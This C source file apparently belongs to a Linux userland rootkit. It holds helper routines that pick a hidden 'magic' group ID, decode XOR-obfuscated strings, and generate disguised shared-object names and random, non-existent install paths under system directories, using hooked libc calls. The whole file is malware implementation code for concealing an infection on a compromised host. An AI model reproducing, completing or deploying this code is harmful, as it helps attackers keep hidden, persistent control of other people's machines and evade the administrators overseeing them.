/* the callers of these functions should already have, beforehand, initialised the seed for random stuff. */

int _randnum(int min, int max){
    int r;
    while((r = rand() % max) == 0 || r < min);
    return r;
}
id_t randid(void){
    usleep(20000);
    id_t id = 0;
    int taken;

    while((taken = idtaken(id)))
        id = (id_t)(rand() % (MAX_GID - MIN_GID + 1)) + MIN_GID;
    taken < 0 ? id = MAGIC_GID : 0;

    return id;
}
char randchar(char *cset){
    char *rset = xordup(cset);
    char ret = rset[rand() % strlen(rset)];
    clean(rset);
    return ret;
}

/* intended for returning a random environment variable, all uppercase, of length len. */
char *randvar(int len){
    int i;
    char buf[len+1];

    memset(buf, 0, sizeof(buf));
    for(i=0; i<len; i++)
        buf[i] = randchar(AUPPERCASE);
    buf[i] = '\0';

    char *ret = malloc(i+1);
    if(!ret) return NULL;
    memset(ret, 0, i+1);
    strncpy(ret, buf, i);
    return ret;
}

/* returns a random garbage string of length len consisting of upper & lowercase characters. */
char *randgarb(size_t len){
    size_t i=0, sc;
    char buf[len+1];
    char *charsets[] = {AUPPERCASE, ALOWERCASE};
    sc = sizeofarr(charsets);

    srand(time(NULL));
    memset(buf, 0, len+1);
    for(i=0; i<len; i++)
        buf[i] = randchar(charsets[rand()%sc]);
    buf[i] = '\0';

    char *ret = malloc(i+1);
    if(!ret) return NULL;
    memset(ret, 0, i+1);
    strncpy(ret, buf, i);
    return ret;
}

/* returns a new soname based on the name of the installdir.
 * if the installdir's name does not have 'lib' at the beginning of it, the resulting soname gets 'lib' prepended to it. */
char *randso(char *installdir){
    char *dupdup, *bname, *ret;
    size_t rs;

    dupdup = xordup(installdir);
    bname = basename(dupdup);
    rs = strlen(bname)+1;

    ret = malloc(rs+6);
    if(!ret){
        clean(dupdup);
        return NULL;
    }

    memset(ret, 0, rs+6);
    if(strncmp("lib", bname, 3)){
        ret[0] = 'l';
        ret[1] = 'i';
        ret[2] = 'b';
        strncpy(ret+3, bname, rs);
    }else strncpy(ret, bname, rs);
    clean(dupdup);
    strcat(ret, ".so");
    return ret;
}


/* returns a random, new, path. if rdir is NULL, a rootdir is selected randomly from the rootdirs array. */
char *randpath(size_t len, char *rdir){
    char *ret, *rootdir;
    DIR *dp;
    int err=0, c=0, s;
    char *dirslist[MAXDIRS], *randdir;
    size_t pathlen, newsize, x=0, j=0;
    struct dirent *dir;

    hook(COPENDIR, CREADDIR, CACCESS);

    /* select valid rootdir for new path to reside within. */
    do{
        if(err++ >= 5) return NULL;
        if(rdir == NULL)
            rootdir = xordup(rootdirs[rand() % ROOTDIRS_SIZE]);
        else rootdir = strdup(rdir);
        if((dp = call(COPENDIR, rootdir)) == NULL)
            clean(rootdir);
    }while(dp == NULL);

    /* from DIR pointer dp, store up to MAXDIRS directory names in a buffer. */
    while((dir = call(CREADDIR, dp)) != NULL && x < MAXDIRS){
        if(dir->d_name[0] == '.')
            continue;

        pathlen = strlen(dir->d_name)+1;
        dirslist[x] = malloc(pathlen);
        if(!dirslist[x]){
            clean(rootdir);
            if(x != 0)
                for(size_t i=0; i<x; i++)
                    clean(dirslist[i]);
            return NULL;
        }
        memset(dirslist[x], 0, pathlen);
        strncpy(dirslist[x++], dir->d_name, pathlen);
    }
    closedir(dp);

    /* select a random directory from buffer. */
    randdir = dirslist[rand() % x];
    /* get rid of every directory name we don't want & make sure we know which we're keeping. */
    for(size_t i=0; i < x; i++)
        !strcmp(randdir, dirslist[i]) ? j = i : clean(dirslist[i]);

    /* create string for new directory within rootdir. */
    char buf[strlen(rootdir)+strlen(randdir)+256];
    memset(buf, 0, sizeof(buf));
    s = snprintf(buf, sizeof(buf)-1, "%s/%s", rootdir, randdir);
    clean(rootdir);
    clean(dirslist[j]); // free dirname which was kept.

    /* path must adhere to specified len. */
    while(s+c < len)
        buf[s + c++] = randchar(ALOWERCASE);
    buf[len] = '\0';
    buf[strlen(buf)-1] = randchar(ALOWERCASE);

    /* we don't want something that actually exists... */
    if((long)call(CACCESS, buf, F_OK) == 0)
        return randpath(len, rdir);

    newsize = strlen(buf)+1;
    ret = malloc(newsize);
    if(!ret) return NULL;
    memset(ret, 0, newsize);
    strncpy(ret, buf, newsize);
    return ret;
}